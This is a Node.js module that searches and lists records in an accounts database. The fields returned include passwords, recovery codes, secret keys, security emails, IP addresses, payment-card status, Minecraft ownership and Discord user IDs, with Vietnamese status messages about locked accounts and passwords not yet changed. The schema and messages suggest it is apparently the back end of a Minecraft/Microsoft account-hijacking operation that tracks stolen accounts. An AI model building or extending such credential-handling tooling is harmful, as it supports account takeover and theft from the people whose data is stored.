const { queryParams } = require("./database");

function enrichAccount(row) {
  if (!row) return null;
  const isLocked = row.email === "Locked!" || row.health_status === "LOCKED";
  const isXbl = row.username === "xbl failed" || row.hasmc === "xbl failed" || row.health_status === "XBL_FAILED";
  const isSuccess = !isLocked && !isXbl && (row.password && row.password !== "");

  let healthStatus = "SUCCESS";
  if (isLocked) healthStatus = "LOCKED";
  else if (isXbl) healthStatus = "XBL_FAILED";
  else if (!isSuccess) healthStatus = "INCOMPLETE";

  const reasons = [];
  if (isLocked) reasons.push("Tài khoản bị khóa (Locked).");
  if (isXbl) reasons.push("Không thể liên kết Xbox Live (XBL Failed).");
  if (!row.password) reasons.push("Chưa đổi hoặc chưa lưu mật khẩu mới.");

  return {
    ...row,
    uid: row.uid,
    email: row.email,
    secemail: row.secemail,
    password: row.password,
    recoverycode: row.recoverycode,
    secretkey: row.secretkey,
    username: row.username,
    ip: row.ip,
    creationdate: row.creationdate,
    cardstatus: row.cardstatus || row.cards,
    devicestatus: row.devicestatus,
    discord_user_id: row.discord_user_id || row.user_id,
    timestamp: row.timestamp || row.time,
    health_status: healthStatus,
    process_status: row.process_status || (isSuccess ? "Hoàn tất" : "Lỗi / Dở dang"),
    diagnosis: {
      reasons,
      summary: reasons.length > 0 ? reasons.join("; ") : "Hoàn tất trọn vẹn"
    }
  };
}

async function findAccount(keyword) {
  try {
    const kw = `%${(keyword || "").trim()}%`;
    const sql = `
      SELECT 
        a.uid,
        a.user_id AS discord_user_id,
        a.username,
        a.ownsmc,
        a.capes,
        a.email,
        a.recoverycode,
        a.secemail,
        a.secretkey,
        a.password,
        a.stats_id,
        a.time AS timestamp,
        e.ip,
        e.creationdate,
        e.cards AS cardstatus,
        e.devicestatus,
        e.hasmc
      FROM accounts a
      LEFT JOIN extrainformation e ON a.uid = e.uid
      WHERE 
        a.uid LIKE ? OR
        a.email LIKE ? OR
        a.secemail LIKE ? OR
        a.username LIKE ? OR
        a.recoverycode LIKE ? OR
        a.user_id LIKE ? OR
        e.ip LIKE ?
      ORDER BY a.id DESC
      LIMIT 25
    `;
    const rows = await queryParams(sql, [kw, kw, kw, kw, kw, kw, kw]);
    return (rows || []).map(enrichAccount);
  } catch (err) {
    console.error("[FIND_ACCOUNT] Error finding account:", err.message);
    return [];
  }
}

async function getFailedAccounts(limit = 50) {
  try {
    const sql = `
      SELECT 
        a.uid,
        a.user_id AS discord_user_id,
        a.username,
        a.ownsmc,
        a.capes,
        a.email,
        a.recoverycode,
        a.secemail,
        a.secretkey,
        a.password,
        a.stats_id,
        a.time AS timestamp,
        e.ip,
        e.creationdate,
        e.cards AS cardstatus,
        e.devicestatus,
        e.hasmc
      FROM accounts a
      LEFT JOIN extrainformation e ON a.uid = e.uid
      WHERE 
        a.email = 'Locked!' OR
        a.username = 'xbl failed' OR
        a.password IS NULL OR
        a.password = ''
      ORDER BY a.id DESC
      LIMIT ?
    `;
    const rows = await queryParams(sql, [limit]);
    return (rows || []).map(enrichAccount);
  } catch (err) {
    console.error("[FIND_ACCOUNT] Error getting failed accounts:", err.message);
    return [];
  }
}

async function getRecentAccounts(limit = 10) {
  try {
    const sql = `
      SELECT 
        a.uid,
        a.user_id AS discord_user_id,
        a.username,
        a.ownsmc,
        a.capes,
        a.email,
        a.recoverycode,
        a.secemail,
        a.secretkey,
        a.password,
        a.stats_id,
        a.time AS timestamp,
        e.ip,
        e.creationdate,
        e.cards AS cardstatus,
        e.devicestatus,
        e.hasmc
      FROM accounts a
      LEFT JOIN extrainformation e ON a.uid = e.uid
      ORDER BY a.id DESC
      LIMIT ?
    `;
    const rows = await queryParams(sql, [limit]);
    return (rows || []).map(enrichAccount);
  } catch (err) {
    console.error("[FIND_ACCOUNT] Error getting recent accounts:", err.message);
    return [];
  }
}

module.exports = {
  findAccount,
  getFailedAccounts,
  getRecentAccounts
};
